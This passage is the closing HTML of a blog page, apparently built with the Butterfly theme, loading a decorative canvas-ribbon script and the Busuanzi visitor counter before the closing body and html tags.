src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
